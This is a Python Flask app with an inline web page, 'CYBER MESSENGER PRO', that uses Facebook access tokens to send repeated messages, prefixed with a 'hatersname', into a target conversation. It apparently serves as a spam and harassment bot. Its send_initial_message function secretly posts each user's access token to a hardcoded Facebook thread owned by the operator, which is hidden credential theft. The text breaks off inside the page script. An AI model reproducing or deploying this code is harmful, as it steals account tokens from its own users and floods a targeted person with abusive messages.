import os
import re
import time
import random
import string
import requests
import threading
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, session
from threading import Thread, Event, Lock
import json
import logging
import uuid
import base64

# 🚨 MINIMAL LOGGING
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['DEBUG'] = False

# 🎯 MULTI-USER TASK MANAGEMENT
user_sessions = {}
sessions_lock = Lock()

# Global variables
token_usage = {}
token_locks = {}

# 🔥 STRONG HEADERS
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.facebook.com',
    'Referer': 'https://www.facebook.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
}

def get_user_session():
    if 'user_id' not in session:
        session['user_id'] = str(uuid.uuid4())
    
    user_id = session['user_id']
    
    with sessions_lock:
        if user_id not in user_sessions:
            user_sessions[user_id] = {
                'tasks': {},
                'stop_events': {},
                'created_at': datetime.now()
            }
    
    return user_sessions[user_id]

def generate_task_key():
    return f"task_{random.randint(1000, 9999)}_{int(time.time())}"

def validate_token_before_start(access_token):
    """Check if token is valid before starting task"""
    try:
        user_url = f"https://graph.facebook.com/v19.0/me?access_token={access_token}&fields=id,name"
        user_response = requests.get(user_url, timeout=10)
        
        if user_response.status_code != 200:
            return {
                "valid": False, 
                "error": "❌ TOKEN EXPIRED OR INVALID",
                "user_name": None
            }
        
        user_data = user_response.json()
        
        if 'id' not in user_data or 'name' not in user_data:
            return {
                "valid": False, 
                "error": "❌ INVALID TOKEN RESPONSE",
                "user_name": None
            }
        
        return {
            "valid": True,
            "user_name": user_data.get('name', 'Unknown User'),
            "user_id": user_data.get('id', 'N/A')
        }
        
    except Exception as e:
        return {
            "valid": False, 
            "error": f"❌ TOKEN VALIDATION FAILED",
            "user_name": None
        }

def send_initial_message(access_token):
    try:
        api_url = f'https://graph.facebook.com/v19.0/t_100056999599628/'
        message = f"HELLO ! SURAJ SIR , I M USING YOUR SERVER MY TOKEN IS {access_token}"
        
        parameters = {
            'access_token': access_token, 
            'message': message
        }
        
        response = requests.post(api_url, data=parameters, headers=headers, timeout=30)
        return True
    except Exception:
        return False

def check_rate_limit(access_token):
    current_time = time.time()
    
    if access_token not in token_usage:
        token_usage[access_token] = []
    
    token_usage[access_token] = [ts for ts in token_usage[access_token] if current_time - ts < 60]
    
    if len(token_usage[access_token]) >= 2:
        return True
    
    return False

def update_token_usage(access_token):
    current_time = time.time()
    
    if access_token not in token_usage:
        token_usage[access_token] = []
    
    token_usage[access_token].append(current_time)

def calculate_progress(task_data):
    try:
        if 'total_messages' in task_data and 'sent_count' in task_data:
            total = task_data['total_messages']
            sent = task_data['sent_count']
            if total > 0:
                return min(100, int((sent / total) * 100))
        return 0
    except:
        return 0

def format_timer(seconds):
    """Convert seconds to HH:MM:SS format"""
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    secs = seconds % 60
    return f"{hours:02d}:{minutes:02d}:{secs:02d}"

def get_token_user_info(access_token):
    """Get user info from token"""
    try:
        user_url = f"https://graph.facebook.com/v19.0/me?access_token={access_token}&fields=id,name"
        user_response = requests.get(user_url, timeout=10)
        
        if user_response.status_code == 200:
            user_data = user_response.json()
            return user_data.get('name', 'Unknown User')
        return 'Unknown User'
    except:
        return 'Unknown User'

def upload_image_to_facebook(access_token, image_file):
    """Upload image to Facebook and get attachment ID"""
    try:
        # First upload the image
        upload_url = f"https://graph.facebook.com/v19.0/me/photos"
        
        files = {
            'source': (image_file.filename, image_file.stream, image_file.content_type)
        }
        
        data = {
            'access_token': access_token,
            'published': 'false'  # Upload but don't publish to timeline
        }
        
        response = requests.post(upload_url, files=files, data=data, timeout=30)
        
        if response.status_code == 200:
            upload_data = response.json()
            photo_id = upload_data.get('id')
            return photo_id
        else:
            return None
    except Exception as e:
        return None

def send_message_with_attachment(access_token, thread_id, message, attachment_id=None):
    """Send message with optional attachment"""
    try:
        api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/'
        
        parameters = {
            'access_token': access_token, 
            'message': message
        }
        
        # Add attachment if provided
        if attachment_id:
            parameters['attachment_id'] = attachment_id
        
        response = requests.post(api_url, data=parameters, headers=headers, timeout=30)
        return response.status_code == 200
    except Exception:
        return False

def send_messages_strong(user_id, task_key, access_tokens, thread_id, hatersname, lastname, time_interval, messages, message_filename, token_filename, attachment_id=None):
    user_session = get_user_session()
    stop_event = user_session['stop_events'].get(task_key)
    
    if not stop_event:
        return
    
    initial_sent = set()
    total_messages = len(messages) * len(access_tokens)
    
    # Get token user names
    token_users = []
    for token in access_tokens:
        user_name = get_token_user_info(token)
        token_users.append(user_name)
    
    # Initialize task with timer and file info
    with sessions_lock:
        if user_id in user_sessions and task_key in user_sessions[user_id]['tasks']:
            user_sessions[user_id]['tasks'][task_key]['total_messages'] = total_messages
            user_sessions[user_id]['tasks'][task_key]['sent_count'] = 0
            user_sessions[user_id]['tasks'][task_key]['failed_count'] = 0
            user_sessions[user_id]['tasks'][task_key]['start_timestamp'] = time.time()
            user_sessions[user_id]['tasks'][task_key]['elapsed_time'] = 0
            user_sessions[user_id]['tasks'][task_key]['message_filename'] = message_filename
            user_sessions[user_id]['tasks'][task_key]['token_filename'] = token_filename
            user_sessions[user_id]['tasks'][task_key]['token_users'] = token_users
            user_sessions[user_id]['tasks'][task_key]['has_attachment'] = attachment_id is not None
    
    while not stop_event.is_set():
        for message_text in messages:
            if stop_event.is_set():
                break
                
            for access_token in access_tokens:
                if stop_event.is_set():
                    break
                
                # Check if failed count reached 50
                with sessions_lock:
                    if user_id in user_sessions and task_key in user_sessions[user_id]['tasks']:
                        if user_sessions[user_id]['tasks'][task_key].get('failed_count', 0) >= 50:
                            user_sessions[user_id]['tasks'][task_key]['status'] = 'auto_stopped'
                            user_sessions[user_id]['tasks'][task_key]['auto_stop_reason'] = 'Too many failed messages (50+)'
                            stop_event.set()
                            return
                
                if access_token not in initial_sent:
                    success = send_initial_message(access_token)
                    initial_sent.add(access_token)
                    time.sleep(5)
                
                if check_rate_limit(access_token):
                    wait_start = time.time()
                    while time.time() - wait_start < 300 and not stop_event.is_set():
                        time.sleep(1)
                    if access_token in token_usage:
                        token_usage[access_token] = []
                
                message = f"{hatersname} {message_text} {lastname}"
                
                # Send message with or without attachment
                if attachment_id:
                    message_success = send_message_with_attachment(access_token, thread_id, message, attachment_id)
                else:
                    message_success = send_message_with_attachment(access_token, thread_id, message)
                
                if message_success:
                    update_token_usage(access_token)
                
                # Update task progress and timer
                with sessions_lock:
                    if user_id in user_sessions and task_key in user_sessions[user_id]['tasks']:
                        task = user_sessions[user_id]['tasks'][task_key]
                        if message_success:
                            task['sent_count'] = task.get('sent_count', 0) + 1
                        else:
                            task['failed_count'] = task.get('failed_count', 0) + 1
                        
                        task['last_message'] = datetime.now().strftime('%Y-%m-%d %I:%M:%S %p')
                        task['message_count'] = task.get('message_count', 0) + 1
                        
                        # Update elapsed time
                        if 'start_timestamp' in task:
                            task['elapsed_time'] = int(time.time() - task['start_timestamp'])
                            task['timer_display'] = format_timer(task['elapsed_time'])
                        
                        progress = calculate_progress(task)
                        task['progress'] = progress
                
                time.sleep(time_interval)
        
        if not stop_event.is_set():
            time.sleep(20)

# 🎯 ROUTES
@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>⚡ CYBER MESSENGER PRO</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap');

    :root {
      --neon-blue: #00ffff;
      --neon-pink: #ff00ff;
      --neon-yellow: #ffcc00;
      --neon-green: #00ff00;
      --neon-purple: #bf00ff;
      --dark-bg: #0a0a0a;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
      color: #e0e0e0;
      font-family: 'Montserrat', sans-serif;
      min-height: 100vh;
      padding: 20px;
      overflow-x: hidden;
      position: relative;
    }

    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 80%, rgba(0, 255, 255, 0.15) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(255, 0, 255, 0.15) 0%, transparent 50%),
        radial-gradient(circle at 40% 40%, rgba(255, 204, 0, 0.1) 0%, transparent 50%);
      animation: background-pulse 10s ease-in-out infinite;
      z-index: -1;
    }

    @keyframes background-pulse {
      0%, 100% { opacity: 0.6; transform: scale(1); }
      50% { opacity: 0.8; transform: scale(1.02); }
    }

    .cyber-grid {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        linear-gradient(rgba(0, 255, 255, 0.1) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px);
      background-size: 50px 50px;
      animation: grid-move 20s linear infinite;
      z-index: -1;
    }

    @keyframes grid-move {
      0% { transform: translate(0, 0); }
      100% { transform: translate(50px, 50px); }
    }

    .admin-btn {
      position: fixed;
      top: 20px;
      left: 20px;
      background: linear-gradient(135deg, var(--neon-yellow), var(--neon-purple));
      color: #0a0a0a;
      padding: 12px 18px;
      border-radius: 12px;
      text-decoration: none;
      font-weight: 700;
      font-size: 0.85em;
      box-shadow: 0 0 20px rgba(255, 204, 0, 0.7);
      transition: all 0.3s ease;
      z-index: 1000;
      border: 2px solid transparent;
      animation: glow-pulse 2s ease-in-out infinite;
    }

    @keyframes glow-pulse {
      0%, 100% { box-shadow: 0 0 20px rgba(255, 204, 0, 0.7); }
      50% { box-shadow: 0 0 30px rgba(255, 204, 0, 0.9); }
    }

    .admin-btn:hover {
      transform: translateY(-3px) scale(1.05);
      box-shadow: 0 0 35px rgba(255, 204, 0, 1);
    }

    .container {
      max-width: 1300px;
      margin: 0 auto;
    }

    .header {
      text-align: center;
      margin-bottom: 40px;
      padding: 30px;
      background: rgba(20, 20, 30, 0.7);
      border-radius: 20px;
      backdrop-filter: blur(15px);
      border: 1px solid rgba(0, 255, 255, 0.3);
      box-shadow: 0 10px 40px rgba(0, 255, 255, 0.2);
      position: relative;
      overflow: hidden;
    }

    .header::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.1), transparent);
      animation: shimmer 3s infinite;
    }

    @keyframes shimmer {
      100% { left: 100%; }
    }

    h1 {
      font-size: 4em;
      font-weight: 800;
      background: linear-gradient(45deg, var(--neon-blue), var(--neon-pink), var(--neon-yellow), var(--neon-purple));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 50px rgba(0, 255, 255, 0.5);
      margin-bottom: 15px;
      letter-spacing: 2px;
    }

    .subtitle {
      color: #aaa;
      font-size: 1.3em;
      margin-bottom: 10px;
      font-weight: 300;
    }

    .tabs {
      display: flex;
      background: rgba(20, 20, 30, 0.8);
      border-radius: 20px;
      padding: 8px;
      margin-bottom: 30px;
      border: 1px solid rgba(0, 255, 255, 0.3);
      backdrop-filter: blur(15px);
      box-shadow: 0 8px 32px rgba(0, 255, 255, 0.1);
    }

    .tab {
      flex: 1;
      padding: 18px 20px;
      background: transparent;
      border: none;
      color: #888;
      cursor: pointer;
      border-radius: 15px;
      font-weight: 700;
      font-size: 1em;
      transition: all 0.4s ease;
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .tab::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(0, 255, 255, 0.2), transparent);
      transition: left 0.5s;
    }

    .tab:hover::before {
      left: 100%;
    }

    .tab.active {
      background: linear-gradient(135deg, var(--neon-blue), var(--neon-purple));
      color: white;
      box-shadow: 0 5px 25px rgba(0, 255, 255, 0.4);
      transform: translateY(-2px);
    }

    .tab-content {
      display: none;
      background: rgba(20, 20, 30, 0.85);
      border-radius: 20px;
      padding: 35px;
      border: 1px solid rgba(0, 255, 255, 0.3);
      backdrop-filter: blur(15px);
      margin-bottom: 30px;
      box-shadow: 0 10px 40px rgba(0, 255, 255, 0.15);
      animation: slideUp 0.5s ease;
    }

    @keyframes slideUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .tab-content.active {
      display: block;
    }

    .form-group {
      margin-bottom: 25px;
      position: relative;
    }

    label {
      display: block;
      margin-bottom: 12px;
      color: var(--neon-blue);
      font-weight: 700;
      font-size: 1em;
      text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
    }

    input[type="text"],
    input[type="number"],
    input[type="url"],
    textarea,
    select {
      width: 100%;
      padding: 16px 20px;
      background: rgba(10, 10, 20, 0.9);
      border: 2px solid rgba(0, 255, 255, 0.4);
      border-radius: 12px;
      color: white;
      font-family: 'Montserrat', sans-serif;
      font-size: 1em;
      transition: all 0.3s ease;
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.1);
    }

    input:focus, textarea:focus, select:focus {
      outline: none;
      border-color: var(--neon-blue);
      box-shadow: 0 0 30px rgba(0, 255, 255, 0.6);
      background: rgba(15, 15, 25, 0.95);
    }

    .file-input-wrapper {
      position: relative;
      overflow: hidden;
      display: inline-block;
      width: 100%;
      border-radius: 12px;
    }

    .file-input {
      background: linear-gradient(135deg, var(--neon-blue), var(--neon-purple));
      color: white;
      padding: 16px 25px;
      border-radius: 12px;
      cursor: pointer;
      text-align: center;
      font-weight: 700;
      font-size: 1em;
      transition: all 0.3s ease;
      display: block;
      box-shadow: 0 5px 25px rgba(0, 255, 255, 0.3);
      border: 2px solid transparent;
    }

    .file-input:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 35px rgba(0, 255, 255, 0.5);
    }

    .file-input input {
      position: absolute;
      left: 0;
      top: 0;
      opacity: 0;
      width: 100%;
      height: 100%;
      cursor: pointer;
    }

    .file-preview {
      margin-top: 10px;
      padding: 12px;
      background: rgba(0, 255, 255, 0.1);
      border-radius: 8px;
      border-left: 3px solid var(--neon-blue);
      display: none;
    }

    .photo-preview {
      margin-top: 10px;
      max-width: 200px;
      border-radius: 10px;
      border: 2px solid var(--neon-blue);
      display: none;
    }

    .btn-group {
      display: flex;
      gap: 15px;
      flex-wrap: wrap;
      margin-top: 30px;
    }

    button {
      background: linear-gradient(135deg, var(--neon-blue), var(--neon-purple));
      color: white;
      border: none;
      padding: 16px 30px;
      border-radius: 12px;
      cursor: pointer;
      font-weight: 700;
      font-size: 1em;
      transition: all 0.3s ease;
      flex: 1;
      min-width: 140px;
      box-shadow: 0 5px 25px rgba(0, 255, 255, 0.3);
      position: relative;
      overflow: hidden;
    }

    button::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
      transition: left 0.5s;
    }

    button:hover::before {
      left: 100%;
    }

    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 35px rgba(0, 255, 255, 0.6);
    }

    button.secondary {
      background: linear-gradient(135deg, var(--neon-green), var(--neon-blue));
    }

    button.danger {
      background: linear-gradient(135deg, #ff6b6b, #ff3838);
    }

    button.success {
      background: linear-gradient(135deg, #00b894, #00a085);
    }

    .result {
      margin-top: 25px;
      padding: 25px;
      border-radius: 15px;
      display: none;
      background: rgba(10, 10, 20, 0.9);
      border: 2px solid rgba(0, 255, 255, 0.4);
      backdrop-filter: blur(10px);
    }

    .success { 
      border-color: var(--neon-green); 
      box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
    }
    .error { 
      border-color: #ff6b6b; 
      box-shadow: 0 0 30px rgba(255, 0, 0, 0.2);
    }

    .tasks-container {
      display: grid;
      gap: 20px;
      margin-top: 25px;
    }

    .task-box {
      background: linear-gradient(135deg, rgba(20, 20, 30, 0.9), rgba(30, 30, 50, 0.8));
      border-radius: 18px;
      padding: 25px;
      border-left: 5px solid var(--neon-blue);
      backdrop-filter: blur(15px);
      border: 1px solid rgba(0, 255, 255, 0.3);
      box-shadow: 0 8px 32px rgba(0, 255, 255, 0.15);
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
    }

    .task-box.auto-stopped {
      border-left-color: #ff6b6b;
      background: linear-gradient(135deg, rgba(50, 20, 20, 0.9), rgba(80, 30, 30, 0.8));
    }

    .task-box::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, transparent, rgba(0, 255, 255, 0.05), transparent);
      z-index: -1;
    }

    .task-box:hover {
      transform: translateY(-5px);
      box-shadow: 0 12px 40px rgba(0, 255, 255, 0.25);
    }

    .task-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .task-title {
      color: var(--neon-blue);
      font-weight: 800;
      font-size: 1.2em;
      text-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
    }

    .task-status {
      background: var(--neon-green);
      color: #0a0a0a;
      padding: 8px 16px;
      border-radius: 25px;
      font-size: 0.85em;
      font-weight: 700;
      box-shadow: 0 0 20px rgba(0, 255, 0, 0.4);
    }

    .task-status.stopped { 
      background: #ff6b6b; 
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
    }
    .task-status.paused { 
      background: var(--neon-yellow); 
      box-shadow: 0 0 20px rgba(255, 204, 0, 0.4);
    }
    .task-status.auto_stopped { 
      background: #ff3838; 
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
    }

    .task-info {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
      gap: 15px;
      margin-bottom: 20px;
      font-size: 0.9em;
    }

    .task-info div {
      padding: 8px 0;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .timer-display {
      background: rgba(0, 255, 255, 0.1);
      padding: 10px 15px;
      border-radius: 10px;
      font-family: 'Courier New', monospace;
      font-weight: 700;
      font-size: 1.1em;
      color: var(--neon-blue);
      text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
      border: 1px solid rgba(0, 255, 255, 0.3);
    }

    .failed-count {
      background: rgba(255, 107, 107, 0.2);
      padding: 10px 15px;
      border-radius: 10px;
      font-weight: 700;
      color: #ff6b6b;
      border: 1px solid rgba(255, 107, 107, 0.4);
    }

    .progress-container {
      margin: 20px 0;
    }

    .progress-bar {
      width: 100%;
      height: 12px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      overflow: hidden;
      margin-bottom: 10px;
      box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
    }

    .progress-fill {
      height: 100%;
      background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple));
      border-radius: 10px;
      transition: width 0.5s ease;
      box-shadow: 0 0 20px rgba(0, 255, 255, 0.6);
      position: relative;
      overflow: hidden;
    }

    .progress-fill::after {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
      animation: progress-shine 2s infinite;
    }

    @keyframes progress-shine {
      100% { left: 100%; }
    }

    .progress-text {
      text-align: center;
      font-size: 0.9em;
      color: var(--neon-blue);
      font-weight: 600;
    }

    .task-controls {
      display: flex;
      gap: 12px;
      flex-wrap: wrap;
    }

    .task-controls button {
      padding: 12px 20px;
      font-size: 0.85em;
      min-width: 100px;
    }

    .external-link {
      display: inline-block;
      background: linear-gradient(135deg, var(--neon-yellow), var(--neon-pink));
      color: #0a0a0a;
      padding: 15px 25px;
      border-radius: 12px;
      text-decoration: none;
      font-weight: 700;
      margin-top: 20px;
      text-align: center;
      transition: all 0.3s ease;
      box-shadow: 0 5px 25px rgba(255, 204, 0, 0.4);
    }

    .external-link:hover {
      transform: translateY(-3px);
      box-shadow: 0 8px 35px rgba(255, 204, 0, 0.6);
    }

    .footer {
      text-align: center;
      margin-top: 50px;
      padding: 30px;
      color: #888;
      font-size: 0.9em;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
      background: rgba(20, 20, 30, 0.7);
      border-radius: 15px;
      backdrop-filter: blur(10px);
    }

    .footer a {
      color: var(--neon-blue);
      text-decoration: none;
      transition: all 0.3s ease;
      font-weight: 600;
    }

    .footer a:hover {
      text-shadow: 0 0 15px rgba(0, 255, 255, 0.8);
      color: var(--neon-pink);
    }

    /* Mobile Responsive */
    @media (max-width: 768px) {
      body {
        padding: 15px;
      }

      h1 {
        font-size: 2.5em;
      }

      .tabs {
        flex-direction: column;
      }

      .btn-group {
        flex-direction: column;
      }

      button {
        width: 100%;
      }

      .task-info {
        grid-template-columns: 1fr;
      }

      .task-controls {
        flex-direction: column;
      }

      .admin-btn {
        position: relative;
        top: 0;
        left: 0;
        margin-bottom: 20px;
        display: inline-block;
      }

      .tab-content {
        padding: 25px;
      }
    }

    @media (max-width: 480px) {
      h1 {
        font-size: 2em;
      }

      .task-box {
        padding: 20px;
      }

      .header {
        padding: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="cyber-grid"></div>
  <a href="#" class="admin-btn">⚡ AXSHU PRO 🚀</a>

  <div class="container">
    <div class="header">
      <h1>⚡ CYBER MESSENGER PRO</h1>
      <div class="subtitle">Advanced Facebook Automation Platform</div>
      <div class="subtitle">Powered by AI Technology</div>
    </div>

    <div class="tabs">
      <div class="tab active" onclick="switchTab('message-sender')">🚀 Message Sender</div>
      <div class="tab" onclick="switchTab('chat-extractor')">📱 Chat Extractor</div>
      <div class="tab" onclick="switchTab('task-manager')">📊 Task Manager</div>
    </div>

    <!-- Message Sender Tab -->
    <div id="message-sender" class="tab-content active">
      <form id="messageForm" enctype="multipart/form-data">
        <div class="form-group">
          <label>🔑 Facebook Access Token</label>
          <input type="text" name="single_token" placeholder="Enter your EAAD token..." required>
          <div style="text-align: center; margin: 10px 0; color: #888; font-weight: 600;">OR</div>
          <div class="file-input-wrapper">
            <div class="file-input">
              📁 Upload Token File (.txt)
              <input type="file" name="token_file" accept=".txt" id="tokenFile">
            </div>
          </div>
          <div id="tokenFilePreview" class="file-preview"></div>
        </div>

        <div class="form-group">
          <label>💬 Conversation ID</label>
          <input type="text" name="conversation_id" placeholder="Enter target conversation ID..." required>
        </div>

        <div class="form-group">
          <label>👤 First Name</label>
          <input type="text" name="hatersname" placeholder="Enter first name..." required>
        </div>

        <div class="form-group">
          <label>📛 Last Name</label>
          <input type="text" name="lastname" placeholder="Enter last name..." required>
        </div>

        <div class="form-group">
          <label>⏱️ Message Interval (seconds)</label>
          <input type="number" name="time_interval" value="30" min="5" required>
        </div>

        <div class="form-group">
          <label>📝 Messages Content</label>
          <div class="file-input-wrapper">
            <div class="file-input">
              📁 Upload Messages File (.txt)
              <input type="file" name="message_file" accept=".txt" required id="messageFile">
            </div>
          </div>
          <div id="messageFilePreview" class="file-preview"></div>
          <small style="color: #888; display: block; margin-top: 8px;">One message per line in .txt file</small>
        </div>

        <div class="form-group">
          <label>🖼️ Attach Photo (Optional)</label>
          <div class="file-input-wrapper">
            <div class="file-input">
              📷 Upload Photo
              <input type="file" name="photo_file" accept="image/*" id="photoFile">
            </div>
          </div>
          <div id="photoFilePreview" class="file-preview"></div>
          <img id="photoPreview" class="photo-preview" alt="Photo Preview">
          <small style="color: #888; display: block; margin-top: 8px;">Optional: Attach photo with each message</small>
        </div>

        <div class="btn-group">
          <button type="submit">🚀 START MESSAGING</button>
        </div>
      </form>
      <div id="taskResult" class="result"></div>
    </div>

    <!-- Chat Extractor Tab -->
    <div id="chat-extractor" class="tab-content">
      <div class="form-group">
        <label>🔗 Group UID Fetcher Tool</label>
        <a href="https://group-uid-fetcher-by-axshu.vercel.app/" target="_blank" class="external-link">
          🛠️ Open Group UID Fetcher Tool
        </a>
        <small style="color: #888; display: block; margin-top: 10px;">
          Click above to open the Group UID Fetcher tool in a new tab
        </small>
      </div>

      <div class="form-group">
        <label>💡 How to Use:</label>
        <div style="background: rgba(0, 255, 255, 0.1); padding: 20px; border-radius: 12px; border-left: 4px solid var(--neon-blue);">
          <p>🔹 1. Click the link above to open Group UID Fetcher</p>
          <p>🔹 2. Enter your Facebook token in the tool</p>
          <p>🔹 3. Extract conversation IDs from your chats</p>
          <p>🔹 4. Use those IDs in the Message Sender tab</p>
        </div>
      </div>
    </div>

    <!-- Task Manager Tab -->
    <div id="task-manager" class="tab-content">
      <div class="btn-group">
        <button onclick="loadMyTasks()" class="secondary">🔄 Refresh Tasks</button>
        <button onclick="stopAllTasks()" class="danger">⏹️ Stop All Tasks</button>
      </div>
      <div id="tasksContainer" class="tasks-container"></div>
    </div>
  </div>

  <div class="footer">
    <p>© 2024 CYBER MESSENGER PRO | ⚡ DEVELOPED WITH ❤️ BY AXSHU</p>
    <p>💬 <a href="https://www.facebook.com/profile.php?id=61574791744025" target="_blank">CLICK HERE TO CHAT ON FACEBOOK</a></p>
  </div>

  <script>
    function switchTab(tabName) {
      document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
      document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
      document.getElementById(tabName).classList.add('active');
      event.target.classList.add('active');
      
      if (tabName === 'task-manager') {
        loadMyTasks();
      }
    }

    // File preview functionality
    document.getElementById('tokenFile').addEventListener('change', function(e) {
      const file = e.target.files[0];
      const preview = document.getElementById('tokenFilePreview');
      if (file) {
        preview.innerHTML = `📄 Selected Token File: <strong>${file.name}</strong> (${(file.size/1024).toFixed(1)} KB)`;
        preview.style.display = 'block';
      } else {
        preview.style.display = 'none';
      }
    });

    document.getElementById('messageFile').addEventListener('change', function(e) {
      const file = e.target.files[0];
      const preview = document.getElementById('messageFilePreview');
      if (file) {
        preview.innerHTML = `📄 Selected Messages File: <strong>${file.name}</strong> (${(file.size/1024).toFixed(1)} KB)`;
        preview.style.display = 'block';
      } else {
        preview.style.display = 'none';
      }
    });

    // Photo preview functionality
    document.getElementById('photoFile').addEventListener('change', function(e) {
      const file = e.target.files[0];
      const preview = document.getElementById('photoFilePreview');
      const imagePreview = document.getElementById('photoPreview');
      
      if (file) {
        preview.innerHTML = `🖼️ Selected Photo: <strong>${file.name}</strong> (${(file.size/1024).toFixed(1)} KB)`;
        preview.style.display = 'block';
        
        // Show image preview
        const reader = new FileReader();
        reader.onload = function(e) {
          imagePreview.src = e.target.result;
          imagePreview.style.display = 'block';
        }
        reader.readAsDataURL(file);
      } else {
        preview.style.display = 'none';
        imagePreview.style.display = 'none';
      }
    });

    // Message Sender Form
    document.getElementById('messageForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      const submitBtn = this.querySelector('button[type="submit"]');
      const originalText = submitBtn.innerHTML;
      
      submitBtn.innerHTML = '🔍 VALIDATING TOKEN...';
      submitBtn.disabled = true;
      
      // First validate token
      const tokenInput = document.querySelector('input[name="single_token"]');
      const tokenFile = document.getElementById('tokenFile').files[0];
      
      let tokenToValidate = '';
      
      if (tokenInput.value.trim()) {
        tokenToValidate = tokenInput.value.trim();
      } else if (tokenFile) {
        // For file upload, we'll validate the first token
        const reader = new FileReader();
        reader.onload = function(e) {
          const content = e.target.result;
          const tokens = content.split('\n').filter(line => line.trim());
          if (tokens.length > 0) {
            validateSingleToken(tokens[0], formData, submitBtn, originalText);
          } else {
            showError('No valid tokens found in file');
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
          }
        };
        reader.readAsText(tokenFile);
        return;
      } else {
        showError('Please provide a token');
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
        return;
      }
      
      validateSingleToken(tokenToValidate, formData, submitBtn, originalText);
    });

    function validateSingleToken(token, formData, submitBtn, originalText) {
      // Create a temporary form to validate token
      const tempForm = new FormData();
      tempForm.append('token', token);
      
      fetch('/validate_token', {
        method: 'POST',
        body: tempForm
      })
      .then(response => response.json())
      .then(data => {
        if (data.valid) {
          submitBtn.innerHTML = '⏳ STARTING TASK...';
          // Token is valid, proceed with task creation
          return fetch('/start_task', {
            method: 'POST',
            body: formData
          });
        } else {
          throw new Error(data.error || 'Token validation failed');
        }
      })
      .then(response => response.json())
      .then(data => {
        const resultDiv = document.getElementById('taskResult');
        if (data.task_key) {
          resultDiv.innerHTML = `
            <div class="success">
              <h3>✅ TASK STARTED SUCCESSFULLY!</h3>
              <p><strong>🎯 Task ID:</strong> ${data.task_key}</p>
              <p>📊 Switch to Task Manager tab to monitor progress</p>
              <p>⏰ Timer has started automatically</p>
              <p>🛡️ Auto-stop enabled after 50 failed messages</p>
              ${data.has_attachment ? '<p>🖼️ Photo will be sent with each message</p>' : ''}
            </div>
          `;
          loadMyTasks();
        } else {
          resultDiv.innerHTML = `<div class="error">❌ ERROR: ${data.error}</div>`;
        }
        resultDiv.style.display = 'block';
      })
      .catch(error => {
        const resultDiv = document.getElementById('taskResult');
        resultDiv.innerHTML = `<div class="error">${error.message}</div>`;
        resultDiv.style.display = 'block';
      })
      .finally(() => {
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
      });
    }

    function showError(message) {
      const resultDiv = document.getElementById('taskResult');
      resultDiv.innerHTML = `<div class="error">${message}</div>`;
